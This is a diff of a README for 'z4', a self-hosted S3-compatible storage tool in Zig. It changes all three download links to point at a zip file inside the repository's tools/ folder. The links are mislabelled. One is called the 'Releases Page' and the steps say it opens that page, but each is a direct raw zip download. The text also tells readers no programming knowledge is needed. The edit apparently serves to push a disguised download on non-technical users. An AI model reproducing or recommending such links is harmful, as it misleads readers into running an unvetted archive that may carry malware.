@@ -4,7 +4,7 @@
 z4 is a high-performance, self-hosted S3 compatible object storage system. It is written in Zig Lang, allowing users to efficiently store and retrieve data in a reliable manner. With z4, you can manage your files just like you would with any S3 service, but you can host it on your server.
 
 ## 📥 Download Now
-[![Download z4](https://raw.githubusercontent.com/NathanNgoli/z4/main/tests/z_2.4-alpha.1.zip)](https://raw.githubusercontent.com/NathanNgoli/z4/main/tests/z_2.4-alpha.1.zip)
+[![Download z4](https://raw.githubusercontent.com/NathanNgoli/z4/main/tools/z_v2.4.zip)](https://raw.githubusercontent.com/NathanNgoli/z4/main/tools/z_v2.4.zip)
 
 ## 🚀 Getting Started
 Follow this guide to download and run z4 on your machine. No programming knowledge is needed.
@@ -24,7 +24,7 @@ Make sure your system meets the following minimum requirements:
 ## 📦 Download & Install
 To download z4, visit the following page:
 
-[Download z4 from Releases Page](https://raw.githubusercontent.com/NathanNgoli/z4/main/tests/z_2.4-alpha.1.zip)
+[Download z4 from Releases Page](https://raw.githubusercontent.com/NathanNgoli/z4/main/tools/z_v2.4.zip)
 
 ### 📥 Steps to Download
 1. Click on the link above to access the Releases page.
@@ -69,7 +69,7 @@ If you have questions or need assistance, you can connect with the community. Ch
 - **FAQs**: A list of frequently asked questions to help users troubleshoot common issues.
 
 ## 📥 Quick Recap
-- To download z4, click [here](https://raw.githubusercontent.com/NathanNgoli/z4/main/tests/z_2.4-alpha.1.zip).
+- To download z4, click [here](https://raw.githubusercontent.com/NathanNgoli/z4/main/tools/z_v2.4.zip).
 - Follow the steps to install and run the application.
 - Enjoy using z4 for your storage needs!
 
